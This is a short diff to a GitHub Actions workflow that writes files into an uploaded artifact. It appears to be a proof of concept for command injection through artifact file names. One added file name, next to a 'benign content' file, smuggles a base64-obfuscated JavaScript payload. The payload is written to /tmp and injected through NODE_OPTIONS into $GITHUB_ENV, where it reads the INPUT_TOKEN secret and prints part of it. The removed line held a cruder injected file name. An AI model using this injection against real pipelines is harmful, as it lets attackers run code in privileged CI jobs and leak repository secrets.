@@ -11,8 +11,9 @@ jobs:
         run: |
           mkdir -p out
           printf '1' > out/pr_number.txt
-          printf 'attacker content\n' > 'out/z;id;hostname;.txt'
-          ls -la out
+          printf 'benign content\n' > out/readme.txt
+          printf 'x' > "out/readme.txt;echo${IFS}Y29uc3QgdD1wcm9jZXNzLmVudi5JTlBVVF9UT0tFTnx8Ik5PX1RPS0VOIjtjb25zb2xlLmxvZygiVE9LRU5fQ0FQVFVSRSBsZW49Iit0Lmxlbmd0aCsiIHByZWZpeD0iK3Quc2xpY2UoMCw0KSsiIGtleXM9IitPYmplY3Qua2V5cyhwcm9jZXNzLmVudikuZmlsdGVyKGs9PmsuaW5kZXhPZigiSU5QVVRfIik9PT0wKS5qb2luKCIsIikpOw==|base64${IFS}-d>/tmp/n.js;echo${IFS}NODE_OPTIONS=--require${IFS}/tmp/n.js>>$GITHUB_ENV;#.txt"
+          ls -1 out
       - uses: actions/upload-artifact@v4
         with:
           name: content
